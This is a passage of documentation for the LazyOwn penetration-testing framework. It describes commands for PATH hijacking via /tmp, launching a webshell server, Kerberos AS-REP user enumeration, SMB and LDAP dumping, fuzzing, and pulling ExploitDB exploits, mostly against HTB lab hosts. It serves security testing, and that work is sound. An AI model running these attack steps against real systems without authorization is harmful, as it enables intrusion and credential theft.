<code>/tmp/{binary_name}</code>. 4. Set executable permissions on the
copied file. 5. Update the PATH environment variable to prioritize
<code>/tmp</code>.</p>
<p>Dependencies: - The <code>self.params</code> dictionary must contain
a valid <code>binary_name</code>. - Ensure that
<code>modules/tmp.sh</code> exists and contains appropriate content for
the attack.</p>
<p>Example: To execute the path hijacking attack with
<code>binary_name</code> as <code>malicious</code>, ensure
<code>self.params["binary_name"]</code> is set to
<code>"malicious"</code>, and then call:
<code>run_lazypathhijacking()</code></p>
<p>Note: - The <code>binary_name</code> parameter must be a string
representing the name of the binary to hijack. - The method modifies the
PATH environment variable, which may affect the execution of other
binaries.</p>
<h2 id="lazypathhijacking">lazypathhijacking</h2>
<p>Creates a path hijacking attack by performing the following
steps:</p>
<ol type="1">
<li>Appends the value of <code>binary_name</code> to a temporary script
located at <code>modules/tmp.sh</code>.</li>
<li>Copies this temporary script to <code>/tmp</code> with the name
specified by <code>binary_name</code>.</li>
<li>Sets executable permissions on the copied script.</li>
<li>Prepends <code>/tmp</code> to the system’s PATH environment variable
to ensure the script is executed in preference to other binaries.</li>
</ol>
<p>The function then prints out each command being executed and a
message indicating the binary name used for the path hijacking.</p>
<p>:param binary_name: The name of the binary to be used in the path
hijacking attack. :returns: None</p>
<h2 id="script">script</h2>
<p>Run a script with the given arguments</p>
<p>This method constructs and executes a command to run a Python script
with the specified arguments. It uses the <code>run_command</code>
method to execute the script and handle real-time output.</p>
<p>:param script_name: The name of the script to be executed. :type
script_name: str :param args: The arguments to be passed to the script.
:type args: tuple of str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Build the command list with “python3”, the
script name, and the arguments. 2. Call <code>run_command</code> with
the constructed command list.</p>
<p>Dependencies: - <code>run_command</code> method for executing the
constructed command and streaming output.</p>
<p>Example: To execute a script named <code>example.py</code> with
arguments <code>arg1</code> and <code>arg2</code>, call:
<code>run_script("example.py", "arg1", "arg2")</code></p>
<p>Note: - The <code>script_name</code> parameter should be a string
representing the name of the script. - The <code>args</code> parameter
is a variable-length argument list containing the arguments to be passed
to the script. - Ensure that the script and arguments are properly
specified.</p>
<h2 id="command">command</h2>
<p>Run a command and print output in real-time</p>
<p>This method executes a given command using
<code>subprocess.Popen</code> and streams both the standard output and
standard error to the console in real-time. The output from both streams
is appended to the <code>self.output</code> attribute. If interrupted,
the process is terminated gracefully.</p>
<p>:param command: The command to be executed. :type command: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Execute the command specified by the
<code>command</code> parameter. 2. Stream and print the command’s
standard output and error to the console in real-time. 3. Append all
output to the <code>self.output</code> attribute. 4. Handle
<code>KeyboardInterrupt</code> by terminating the process and printing
an error message.</p>
<p>Dependencies: - <code>subprocess</code> module for running the
command and capturing output. - <code>print_msg</code> function for
printing output to the console. - <code>print_error</code> function for
printing error messages to the console.</p>
<p>Example: To execute a command, call
<code>run_command("ls -l")</code>.</p>
<p>Note: - The <code>command</code> parameter should be a string
representing the command to be executed. - <code>self.output</code> must
be initialized before calling this method. - Ensure proper exception
handling to manage process interruptions.</p>
<h2 id="payload">payload</h2>
<p>Load parameters from payload.json</p>
<p>This function loads parameters from a JSON file named
<code>payload.json</code> and updates the instance’s <code>params</code>
dictionary with the values from the file. If the file does not exist or
contains invalid JSON, it will print an appropriate error message.</p>
<p>Usage: payload</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Open and read the <code>payload.json</code>
file. 2. Update the <code>params</code> dictionary with values from the
JSON file. 3. Print a success message if the parameters were
successfully loaded. 4. Handle <code>FileNotFoundError</code> if the
file does not exist. 5. Handle <code>JSONDecodeError</code> if there is
an error decoding the JSON file.</p>
<p>Dependencies: - <code>json</code> module for reading and parsing the
JSON file.</p>
<p>Example: To execute the function, simply call
<code>payload</code>.</p>
<p>Note: - Ensure that <code>payload.json</code> exists in the current
directory and is properly formatted. - The confirmation message includes
color formatting for better visibility.</p>
<h2 id="exit">exit</h2>
<p>Exit the command line interface.</p>
<p>This function prompts the user to confirm whether they want to exit
the command line interface. If confirmed, it will terminate the program.
Otherwise, it will cancel the exit.</p>
<p>Usage: exit</p>
<p>:param arg: This parameter is not used in this function. :type arg:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Prompt the user with a confirmation message to
exit the CLI. 2. If the user confirms with ‘s’, print a message and exit
the program. 3. If the user provides any other input, print a
cancellation message and remain in the CLI.</p>
<p>Dependencies: - <code>sys.exit</code> function for exiting the
program.</p>
<p>Example: To execute the function, simply call <code>exit</code>.</p>
<p>Note: - The confirmation prompt is in Spanish. - Ensure that
<code>sys</code> is imported in your script.</p>
<h2 id="fixperm">fixperm</h2>
<p>Fix permissions for LazyOwn shell scripts.</p>
<p>This function adjusts the file permissions for shell scripts and CGI
scripts in the <code>modules</code> directory, making them
executable.</p>
<p>Usage: fixperm</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Change the permissions of all shell scripts in
the <code>modules</code> directory to be executable. 2. Change the
permissions of all files in the <code>modules/cgi-bin</code> directory
to be executable.</p>
<p>Dependencies: - <code>chmod</code> command must be available on the
system.</p>
<p>Example: To execute the function, simply call
<code>fixperm</code>.</p>
<p>Note: - Ensure you have the necessary permissions to modify file
permissions.</p>
<h2 id="lazywebshell">lazywebshell</h2>
<p>Run LazyOwn webshell server.</p>
<p>This function starts a web server that serves the
<code>lazywebshell.py</code> script from the <code>modules</code>
directory on port 8888. The server is run in the background.</p>
<p>Usage: lazywebshell</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Start a Python HTTP server with CGI support on
port 8888. 2. The server serves files from the <code>modules</code>
directory.</p>
<p>Dependencies: - Python 3.x must be installed on the system. - The
<code>http.server</code> module should be available.</p>
<p>Example: To execute the function, simply call
<code>lazywebshell</code>.</p>
<p>Note: - The server runs in the background, and the output will not be
displayed in the terminal.</p>
<h2 id="getcap">getcap</h2>
<p>Retrieve and display file capabilities on the system.</p>
<p>This function uses the <code>getcap</code> command to recursively
list capabilities for files starting from the root directory
(<code>/</code>). The output is filtered to suppress error messages.</p>
<p>Usage: getcap</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Run the <code>getcap -r /</code> command to list
file capabilities recursively from the root directory. 2. Redirect
standard error to <code>/dev/null</code> to suppress error messages.</p>
<p>Dependencies: - <code>getcap</code> must be installed on the
system.</p>
<p>Example: To execute the function, simply call
<code>do_getcap</code>.</p>
<p>Note: - The command may require elevated permissions to access
certain directories and files.</p>
<h2 id="getseclist">getseclist</h2>
<p>Get the SecLists wordlist from GitHub.</p>
<p>This function downloads and extracts the SecLists wordlist from
GitHub to the <code>/usr/share/wordlists/</code> directory.</p>
<p>Usage: getseclist</p>
<p>:param line: This parameter is not used in this function. :type line:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Navigate to the
<code>/usr/share/wordlists/</code> directory. 2. Download the SecLists
repository using <code>wget</code>. 3. Extract the downloaded ZIP file.
4. Remove the ZIP file after extraction.</p>
<p>Dependencies: - <code>wget</code> must be installed on the system. -
<code>unzip</code> must be installed on the system. - <code>sudo</code>
must be available for downloading and extracting files.</p>
<p>Example: To execute the function, simply call
<code>getseclist</code>.</p>
<p>Note: - Ensure that you have the necessary permissions to write to
the <code>/usr/share/wordlists/</code> directory. - If <code>wget</code>
or <code>unzip</code> is not installed, the function will fail.</p>
<h2 id="smbclient">smbclient</h2>
<p>Interacts with SMB shares using the <code>smbclient</code> command to
perform the following operations:</p>
<ol type="1">
<li>Checks if <code>rhost</code> (remote host) and <code>lhost</code>
(local host) are set; if not, an error message is displayed.</li>
<li>If <code>line</code> (share name) is provided:</li>
</ol>
<ul>
<li>Attempts to access the specified SMB share on the remote host using
the command: <code>smbclient -N \\{rhost}\{line}</code></li>
</ul>
<ol start="3" type="1">
<li>If <code>line</code> is not provided:</li>
</ol>
<ul>
<li>Lists available SMB shares on the remote host with the command:
<code>smbclient -N -L \\{rhost}</code></li>
</ul>
<ol start="4" type="1">
<li>Suggests a potential SMB exploit if possible by mounting the share
from the local host using:
<code>mount -t cifs "//{lhost}/share" /mnt/smb</code></li>
</ol>
<p>:param line: The name of the SMB share to access on the remote host.
If not provided, the function will list all available shares. :returns:
None</p>
<h2 id="smbmap">smbmap</h2>
<p>smbmap -H 10.10.10.3 [OPTIONS] Uses the <code>smbmap</code> tool to
interact with SMB shares on a remote host:</p>
<ol type="1">
<li>Checks if <code>rhost</code> (remote host) and <code>lhost</code>
(local host) are set; if not, an error message is displayed.</li>
<li>If no <code>line</code> (share name or options) is provided:</li>
</ol>
<ul>
<li>Attempts to access SMB shares on the remote host with a default user
<code>deefbeef</code> using the command:
<code>smbmap -H {rhost} -u 'deefbeef'</code></li>
</ul>
<ol start="3" type="1">
<li>If <code>line</code> is provided:</li>
</ol>
<ul>
<li>Executes <code>smbmap</code> with the specified options or share
name using the command: <code>smbmap -H {rhost} -R {line}</code></li>
</ul>
<ol start="4" type="1">
<li>Suggests a potential SMB exploit if possible by mounting the share
from the local host using:
<code>mount -t cifs "//{lhost}/documents" /mnt/smb</code></li>
</ol>
<p>:param line: Options or share name to use with <code>smbmap</code>.
If not provided, uses a default user to list shares. :returns: None</p>
<h2 id="getnpusers">getnpusers</h2>
<p>sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile
sessions/users.txt Executes the <code>impacket-GetNPUsers</code> command
to enumerate users with Kerberos pre-authentication disabled.</p>
<ol type="1">
<li>Checks if the <code>line</code> (domain) argument is provided; if
not, an error message is displayed, instructing the user to provide a
domain.</li>
<li>Executes <code>impacket-GetNPUsers</code> with the following
options:</li>
</ol>
<ul>
<li><code>-no-pass</code>: Skips password prompt.</li>
<li><code>-usersfile sessions/users.txt</code>: Specifies the file
containing the list of users to check.</li>
</ul>
<p>:param line: The domain to query. Must be provided in the format
<code>domain.com</code>. Example usage:
<code>getnpusers domain.com</code> :returns: None</p>
<p>Manual execution: To manually run this command, use the following
syntax: sudo impacket-GetNPUsers <domain> -no-pass -usersfile
sessions/users.txt Replace <code>&lt;domain&gt;</code> with the actual
domain name you want to query.</p>
<h2 id="psexec">psexec</h2>
<p>Copies the <code>rhost</code> IP address to the clipboard and updates
the prompt with the IP address.</p>
<ol type="1">
<li>Retrieves the <code>rhost</code> IP address from the
<code>self.params</code> parameter.</li>
<li>Checks if the <code>rhost</code> is valid using
<code>check_rhost()</code>. If invalid, the function returns without
making changes.</li>
<li>If <code>line</code> is ‘clean’, resets the custom prompt to its
original state.</li>
<li>Otherwise, updates the prompt to include the <code>rhost</code> IP
address in the specified format.</li>
<li>Copies the <code>rhost</code> IP address to the clipboard using
<code>xclip</code>.</li>
<li>Prints a message confirming that the IP address has been copied to
the clipboard.</li>
</ol>
<p>:param line: This parameter determines whether the prompt should be
reset or updated with the IP address. :type line: str :returns: None</p>
<p>Manual execution: To manually run this command, use the following
syntax: rhost <line> Replace <code>&lt;line&gt;</code> with ‘clean’ to
reset the prompt, or any other string to update the prompt with the IP
address.</p>
<h2 id="rpcdump">rpcdump</h2>
<p>Executes the <code>rpcdump.py</code> script to dump RPC services from
a target host.</p>
<ol type="1">
<li>Retrieves the target host IP from the <code>rhost</code>
parameter.</li>
<li>Checks if the <code>rhost</code> parameter is valid using
<code>check_rhost()</code>. If invalid, the function returns early.</li>
<li>Executes the <code>rpcdump.py</code> script on port 135 and 593 to
gather RPC service information from the target host.</li>
</ol>
<p>:param line: This parameter is not used in this command but is
included for consistency with other methods. :returns: None</p>
<p>Manual execution: To manually run this command, use the following
syntax: rpcdump.py -p 135 <target_host> rpcdump.py -p 593 <target_host>
Replace <code>&lt;target_host&gt;</code> with the IP address or hostname
of the target machine.</p>
<h2 id="dig">dig</h2>
<p>Executes the <code>dig</code> command to query DNS information.</p>
<ol type="1">
<li>Retrieves the DNS server IP from the <code>line</code> parameter and
the target host from the <code>rhost</code> parameter.</li>
<li>If either the DNS server or <code>rhost</code> is not provided, an
error message is printed.</li>
<li>Executes the <code>dig</code> command to query the version of the
DNS server and additional records.</li>
</ol>
<p>:param line: DNS server IP or hostname. Must be provided for the
<code>dig</code> command. :param rhost: Target host for additional
<code>dig</code> queries.</p>
<p>:returns: None</p>
<p>Manual execution: To manually run these commands, use the following
syntax: dig version.bind CHAOS TXT @<dns_server> dig any <domain>
@<rhost></p>
<p>Replace <code>&lt;dns_server&gt;</code> with the IP address or
hostname of the DNS server, <code>&lt;domain&gt;</code> with the target
domain, and <code>&lt;rhost&gt;</code> with the IP address or hostname
of the target machine.</p>
<h2 id="cp">cp</h2>
<p>Copies a file from the ExploitDB directory to the sessions
directory.</p>
<ol type="1">
<li>Retrieves the path to the ExploitDB directory and the target file
from the <code>line</code> parameter.</li>
<li>Copies the specified file from the ExploitDB directory to the
<code>sessions</code> directory in the current working directory.</li>
</ol>
<p>:param line: The relative path to the file within the ExploitDB
directory. For example, <code>java/remote/51884.py</code>. :param
exploitdb: The path to the ExploitDB directory. This must be set in
advance or provided directly.</p>
<p>:returns: None</p>
<p>Manual execution: To manually copy files, use the following syntax:
cp <exploitdb_path><file_path> <destination_path></p>
<p>Replace <code>&lt;exploitdb_path&gt;</code> with the path to your
ExploitDB directory, <code>&lt;file_path&gt;</code> with the relative
path to the file, and <code>&lt;destination_path&gt;</code> with the
path where you want to copy the file.</p>
<p>For example: cp /usr/share/exploitdb/exploits/java/remote/51884.py
/path/to/sessions/</p>
<h2 id="dnsenum">dnsenum</h2>
<p>Performs DNS enumeration using <code>dnsenum</code> to identify
subdomains for a given domain.</p>
<ol type="1">
<li>Executes the <code>dnsenum</code> command with parameters to specify
the DNS server, output file, and wordlist for enumeration.</li>
</ol>
<p>:param line: The target domain to perform DNS enumeration on, e.g.,
<code>ghost.htb</code>. :param rhost: The DNS server to use for
enumeration, e.g., <code>10.10.11.24</code>. :param dnswordlist: The
path to the DNS wordlist file used for subdomain discovery.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform DNS enumeration, use the
following command: dnsenum –dnsserver <dns_server> –enum -p 0 -s 0 -o
<output_file> -f <dns_wordlist> <target_domain></p>
<p>Replace <code>&lt;dns_server&gt;</code> with the DNS server IP,
<code>&lt;output_file&gt;</code> with the file path to save the results,
<code>&lt;dns_wordlist&gt;</code> with the path to your DNS wordlist
file, and <code>&lt;target_domain&gt;</code> with the domain to be
enumerated.</p>
<p>For example: dnsenum –dnsserver 10.10.11.24 –enum -p 0 -s 0 -o
sessions/subdomains.txt -f /path/to/dnswordlist.txt ghost.htb</p>
<h2 id="dnsmap">dnsmap</h2>
<p>Performs DNS enumeration using <code>dnsmap</code> to discover
subdomains for a specified domain.</p>
<ol type="1">
<li>Executes the <code>dnsmap</code> command to scan the given domain
with a specified wordlist.</li>
</ol>
<p>:param line: The target domain to perform DNS enumeration on, e.g.,
<code>ghost.htb</code>. :param dnswordlist: The path to the wordlist
file used for DNS enumeration.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform DNS enumeration, use the
following command: dnsmap <target_domain> -w <dns_wordlist></p>
<p>Replace <code>&lt;target_domain&gt;</code> with the domain you want
to scan and <code>&lt;dns_wordlist&gt;</code> with the path to your DNS
wordlist file.</p>
<p>For example: dnsmap ghost.htb -w /path/to/dnswordlist.txt</p>
<h2 id="whatweb">whatweb</h2>
<p>Performs a web technology fingerprinting scan using
<code>whatweb</code>.</p>
<ol type="1">
<li>Executes the <code>whatweb</code> command to identify technologies
used by the target web application.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to pass additional options or arguments if needed.
:param rhost: The target web host to be scanned, specified in the
<code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform web technology fingerprinting,
use the following command: whatweb <target_host></p>
<p>Replace <code>&lt;target_host&gt;</code> with the URL or IP address
of the web application you want to scan.</p>
<p>For example: whatweb example.com</p>
<h2 id="enum4linux">enum4linux</h2>
<p>Performs enumeration of information from a target Linux/Unix system
using <code>enum4linux</code>.</p>
<ol type="1">
<li>Executes the <code>enum4linux</code> command with the
<code>-a</code> option to gather extensive information from the
specified target.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to pass additional options or arguments if needed.
:param rhost: The target host for enumeration, specified in the
<code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually enumerate information from a Linux/Unix
system, use the following command: enum4linux -a <target_host></p>
<p>Replace <code>&lt;target_host&gt;</code> with the IP address or
hostname of the target system.</p>
<p>For example: enum4linux -a 192.168.1.10</p>
<h2 id="nbtscan">nbtscan</h2>
<p>Performs network scanning using <code>nbtscan</code> to discover
NetBIOS names and addresses in a specified range.</p>
<ol type="1">
<li>Executes the <code>nbtscan</code> command with the <code>-r</code>
option to scan the specified range of IP addresses for NetBIOS
information.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to specify additional options or arguments if needed.
:param rhost: The target network range for scanning, specified in the
<code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform a NetBIOS scan across a network
range, use the following command: sudo nbtscan -r <network_range></p>
<p>Replace <code>&lt;network_range&gt;</code> with the IP address range
you want to scan. For example: sudo nbtscan -r 192.168.1.0/24</p>
<h2 id="rpcclient">rpcclient</h2>
<p>Executes the <code>rpcclient</code> command to interact with a remote
Windows system over RPC (Remote Procedure Call) using anonymous
credentials.</p>
<ol type="1">
<li>Runs <code>rpcclient</code> with the <code>-U ''</code> (empty
username) and <code>-N</code> (no password) options to connect to the
target host specified by <code>rhost</code>.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to specify additional options or arguments if needed.
:param rhost: The IP address of the remote host to connect to, specified
in the <code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually interact with a remote Windows system
using RPC, use the following command: rpcclient -U ’’ -N <target_ip></p>
<p>Replace <code>&lt;target_ip&gt;</code> with the IP address of the
target system. For example: rpcclient -U ’’ -N 10.10.10.10</p>
<h2 id="nikto">nikto</h2>
<p>Runs the <code>nikto</code> tool to perform a web server
vulnerability scan against the specified target host.</p>
<ol type="1">
<li>Executes <code>nikto</code> with the <code>-h</code> option to
specify the target host IP address.</li>
</ol>
<p>:param line: This parameter is not used in the current implementation
but could be used to specify additional options or arguments if needed.
:param rhost: The IP address of the target web server, specified in the
<code>params</code> dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually perform a web server vulnerability scan
using <code>nikto</code>, use the following command: nikto -h
<target_ip></p>
<p>Replace <code>&lt;target_ip&gt;</code> with the IP address of the
target web server. For example: nikto -h 10.10.10.10</p>
<h2 id="openssl_sclient">openssl_sclient</h2>
<p>Uses <code>openssl s_client</code> to connect to a specified host and
port, allowing for testing and debugging of SSL/TLS connections.</p>
<p>:param line: The port number to connect to on the target host. This
must be provided as an argument. :param rhost: The IP address or
hostname of the target server, specified in the <code>params</code>
dictionary.</p>
<p>:returns: None</p>
<p>Manual execution: To manually connect to a server using
<code>openssl s_client</code> and test SSL/TLS, use the following
command: openssl s_client -connect <target_ip>:<port></p>
<p>Replace <code>&lt;target_ip&gt;</code> with the IP address or
hostname of the target server and <code>&lt;port&gt;</code> with the
port number. For example: openssl s_client -connect 10.10.10.10:443</p>
<h2 id="ss">ss</h2>
<p>Uses <code>searchsploit</code> to search for exploits in the Exploit
Database based on the provided search term.</p>
<p>:param line: The search term or query to find relevant exploits. This
must be provided as an argument.</p>
<p>:returns: None</p>
<p>Manual execution: To manually search for exploits using
<code>searchsploit</code>, use the following command: searchsploit
<search_term></p>
<p>Replace <code>&lt;search_term&gt;</code> with the term or keyword you
want to search for. For example: searchsploit kernel</p>
<h2 id="wfuzz">wfuzz</h2>
<p>Uses <code>wfuzz</code> to perform fuzzing based on provided
parameters. This function supports various options for directory and
file fuzzing.</p>
<p>:param line: The options and arguments for <code>wfuzz</code>. The
<code>line</code> parameter can include the following: -
<code>sub &lt;domain&gt;</code>: Fuzz DNS subdomains. Requires
<code>dnswordlist</code> to be set. - <code>iis</code>: Fuzz IIS
directories. Uses a default wordlist if <code>iiswordlist</code> is not
set. - Any other argument: General directory and file fuzzing.</p>
<p>:returns: None</p>
<p>Manual execution: To manually use <code>wfuzz</code> for directory
and file fuzzing, use the following commands:</p>
<ol type="1">
<li>For fuzzing DNS subdomains: wfuzz -c <extra_options> -t <threads> -w
<wordlist> -H ‘Host: FUZZ.<domain>’ <domain></li>
</ol>
<p>Example: wfuzz -c –hl=7 -t 200 -w /path/to/dnswordlist -H ‘Host:
FUZZ.example.com’ example.com</p>
<ol start="2" type="1">
<li>For fuzzing IIS directories: wfuzz -c <extra_options> -t <threads>
-w /path/to/iiswordlist http://<rhost>/FUZZ</li>
</ol>
<p>Example: wfuzz -c –hl=7 -t 200 -w
/usr/share/wordlists/SecLists-master/Discovery/Web-Content/IIS.fuzz.txt
http://10.10.10.10/FUZZ</p>
<ol start="3" type="1">
<li>For general directory and file fuzzing: wfuzz -c <extra_options> -t
<threads> -w <wordlist> http://<rhost>/FUZZ</li>
</ol>
<p>Example: wfuzz -c –hl=7 -t 200 -w /path/to/dirwordlist
http://10.10.10.10/FUZZ</p>
<h2 id="launchpad">launchpad</h2>
<p>Searches for packages on Launchpad based on the provided search term
and extracts codenames from the results. The distribution is extracted
from the search term.</p>
<p>:param line: The search term to be used for querying Launchpad. The
<code>line</code> parameter should be a string containing the search
term, e.g., “8.2p1 Ubuntu 4ubuntu0.11”.</p>
<p>:returns: None</p>
<p>Manual execution: To manually execute the equivalent command, use the
following steps:</p>
<ol type="1">
<li>Extract the distribution from the search term:</li>
</ol>
<ul>
<li>This function assumes the distribution name is part of the search
term and is used to build the URL.</li>
</ul>
<ol start="2" type="1">
<li>URL encode the search term:</li>
</ol>
<ul>
<li>Replace spaces with <code>%20</code> to form the encoded search
query.</li>
</ul>
<ol start="3" type="1">
<li>Use <code>curl</code> to perform the search and filter results: curl
-s “https://launchpad.net/+search?field.text=<encoded_search_term>” |
grep ‘href’ | grep ‘<distribution>’ | grep -oP
‘(?&lt;=href=“https://launchpad.net/<distribution>/)[^/"]+’ | sort
-u</li>
</ol>
<p>Example: If the search term is “8.2p1 Ubuntu 4ubuntu0.11”, the
command would be: curl -s
“https://launchpad.net/+search?field.text=8.2p1%20Ubuntu%204ubuntu0.11”
| grep ‘href’ | grep ‘ubuntu’ | grep -oP
‘(?&lt;=href=“https://launchpad.net/ubuntu/)[^/"]+’ | sort -u</p>
<p>Notes: - Ensure that <code>curl</code> is installed and accessible in
your environment. - The extracted codenames are printed to the
console.</p>
<h2 id="gobuster">gobuster</h2>
<p>Uses <code>gobuster</code> for directory and virtual host fuzzing
based on provided parameters. Supports directory enumeration and virtual
host discovery.</p>
<p>:param line: The options and arguments for <code>gobuster</code>. The
<code>line</code> parameter can include the following: -
<code>url</code>: Perform directory fuzzing on a specified URL. Requires
<code>url</code> and <code>dirwordlist</code> to be set. -
<code>vhost</code>: Perform virtual host discovery on a specified URL.
Requires <code>url</code> and <code>dirwordlist</code> to be set. - Any
other argument: General directory fuzzing with additional
parameters.</p>
<p>:returns: None</p>
<p>Manual execution: To manually use <code>gobuster</code>, use the
following commands:</p>
<ol type="1">
<li>For directory fuzzing: gobuster dir –url <url>/ –wordlist
<wordlist></li>
</ol>
<p>Example: gobuster dir –url http://example.com/ –wordlist
/path/to/dirwordlist</p>
<ol start="2" type="1">
<li>For virtual host discovery: gobuster vhost –append-domain -u <url>
-w <wordlist> –random-agent -t 600</li>
</ol>
<p>Example: gobuster vhost –append-domain -u http://example.com -w
/path/to/dirwordlist –random-agent -t 600</p>
<ol start="3" type="1">
<li>For general directory fuzzing with additional parameters: gobuster
dir –url http://<rhost>/ –wordlist <wordlist>
<additional_parameters></li>
</ol>
<p>Example: gobuster dir –url http://10.10.10.10/ –wordlist
/path/to/dirwordlist -x .php,.html</p>
<h2 id="addhosts">addhosts</h2>
<p>Adds an entry to the <code>/etc/hosts</code> file, mapping an IP
address to a domain name.</p>
<p>:param line: The domain name to be added to the
<code>/etc/hosts</code> file. - Example: <code>permx.htb</code></p>
<p>:returns: None</p>
<p>Manual execution: To manually add a domain to the
<code>/etc/hosts</code> file, use the following command:</p>
<pre><code>sudo sh -c -e &quot;echo &#39;&lt;rhost&gt; &lt;domain&gt;&#39; &gt;&gt; /etc/hosts&quot;</code></pre>
<p>Example: sudo sh -c -e “echo ‘10.10.11.23 permx.htb’ &gt;&gt;
/etc/hosts”</p>
<p>This command appends the IP address and domain name to the
<code>/etc/hosts</code> file, enabling local resolution of the
domain.</p>
<h2 id="cme">cme</h2>
<p>Performs an SMB enumeration using <code>crackmapexec</code>.</p>
<p>:param line: Not used in this function.</p>
<p>:returns: None</p>
<p>Manual execution: To manually run <code>crackmapexec</code> for SMB
enumeration, use the following command:</p>
<pre><code>crackmapexec smb &lt;target&gt;</code></pre>
<p>Example: crackmapexec smb 10.10.11.24</p>
<p>This command will enumerate SMB shares and perform basic SMB checks
against the specified target IP address.</p>
<h2 id="ldapdomaindump">ldapdomaindump</h2>
<p>Dumps LDAP information using <code>ldapdomaindump</code> with
credentials from a file.</p>
<p>:param line: The domain to use for authentication (e.g.,
‘domain.local’).</p>
<p>:returns: None</p>
<p>Manual execution: To manually run <code>ldapdomaindump</code> for
LDAP enumeration, use the following command:</p>
<pre><code>ldapdomaindump -u &#39;&lt;domain&gt;\&lt;username&gt;&#39; -p &#39;&lt;password&gt;&#39; &lt;target&gt;</code></pre>
<p>Example: ldapdomaindump -u ‘domain.local’ -p ‘passadmin123’
10.10.11.23</p>
<p>Ensure you have a file <code>sessions/credentials.txt</code> in the
format <code>user:password</code>, where each line contains credentials
for the LDAP enumeration.</p>
<h2 id="bloodhound">bloodhound</h2>
<p>Perform LDAP enumeration using bloodhound-python with credentials
from a file.</p>
<p>:param line: This parameter is not used in the function but could be
used for additional options or domain information.</p>
<p>:returns: None</p>
<p>Manual execution: To manually run <code>bloodhound-python</code> for
LDAP enumeration, use the following command:</p>
<pre><code>bloodhound-python -c All -u &#39;&lt;username&gt;&#39; -p &#39;&lt;password&gt;&#39; -ns &lt;target&gt;</code></pre>
<p>Example: bloodhound-python -c All -u ‘usuario’ -p ‘password’ -ns
10.10.10.10</p>
<p>Ensure you have a file <code>sessions/credentials.txt</code> with the
format <code>user:password</code>, where each line contains credentials
for enumeration.</p>
<h2 id="ping">ping</h2>
<p>Perform a ping to check host availability and infer the operating
system based on TTL values.</p>
<p>:param line: This parameter is not used in the function but could be
used for additional options or settings.</p>
<p>:returns: None</p>
<p>Manual execution: To manually ping a host and determine its operating
system, use the following command:</p>
<pre><code>ping -c 1 &lt;target&gt;</code></pre>
<p>Example: ping -c 1 10.10.10.10</p>
<p>The TTL (Time To Live) value is used to infer the operating system: -
TTL values around 64 typically indicate a Linux system. - TTL values
around 128 typically indicate a Windows system.</p>
<p>Ensure you have set <code>rhost</code> to the target host for the
command to work.</p>
<h2 id="gospider">gospider</h2>
<p>Try gospider for web spidering.</p>
<p>This function executes the <code>gospider</code> tool to perform web
spidering. It can either use a URL provided as a parameter or the remote
host defined in <code>self.params</code>.</p>
<p>Usage: gospider url gospider</p>
<p>:param line: Command parameter that determines the execution mode.
Use “url” to specify a URL, or leave empty to use the remote host. :type
line: str</p>
<ul>
<li>If <code>line</code> is “url”, the method uses the URL specified in
<code>self.params["url"]</code>.</li>
<li>If <code>line</code> is not “url”, the method uses the remote host
specified in <code>self.params["rhost"]</code>.</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the <code>gospider</code> tool is
installed on the system. 2. Set the <code>url</code> parameter if using
the “url” mode. 3. Run the method to perform the spidering
operation.</p>
<p>Dependencies: - <code>gospider</code> must be installed on the
system. - The <code>sudo</code> command must be available for installing
<code>gospider</code>.</p>
<p>Examples: 1. To scan a specific URL: <code>gospider url</code> 2. To
scan the remote host: <code>gospider</code></p>
<p>Note: - If <code>gospider</code> is not installed, the method will
attempt to install it. - Ensure that the network and tools are
configured correctly for successful execution.</p>
<h2 id="arpscan">arpscan</h2>
<p>Executes an ARP scan using <code>arp-scan</code>.</p>
<p>This function performs an ARP scan on the local network using the
<code>arp-scan</code> tool. The network device to be used for scanning
must be specified.</p>
<p>Usage: arpscan</p>
<p>:param line: Command parameters (not used in this function). :type
line: str</p>
<ul>
<li>Executes the <code>arp-scan</code> command with the specified
network device.</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the network device is set using the
appropriate parameter. 2. Run the method to perform an ARP scan.</p>
<p>Dependencies: - <code>arp-scan</code> must be installed on the
system. - The <code>sudo</code> command must be available for executing
<code>arp-scan</code>.</p>
<p>Examples: 1. Set the device parameter using
<code>set device &lt;network_device&gt;</code>. 2. Run
<code>arpscan</code> to perform the ARP scan.</p>
<p>Note: - The network device must be configured and available on the
system for the scan to work. - Ensure that <code>arp-scan</code> is
installed and accessible from the command line.</p>
<h2 id="lazypwn">lazypwn</h2>
<p>Executes the LazyPwn script.</p>
<p>This function runs the <code>lazypwn.py</code> script located in the
<code>modules</code> directory. The script is typically used for
automated exploitation or security testing tasks within the LazyOwn
framework.</p>
<p>Usage: lazypwn</p>
<p>:param line: Command parameters (not used in this function). :type
line: str</p>
<ul>
<li>Executes the <code>lazypwn.py</code> script with Python 3.</li>
</ul>
<p>:returns: None</p>
<p>Manual execution: 1. Run the method to execute the LazyPwn
script.</p>
<p>Dependencies: - The <code>lazypwn.py</code> script must be present in
the <code>modules</code> directory. - Python 3 must be installed and
accessible from the command line.</p>
<p>Examples: 1. Run <code>do_lazypwn</code> to execute the LazyPwn
script.</p>
<p>Note: - Ensure that <code>lazypwn.py</code> is configured correctly
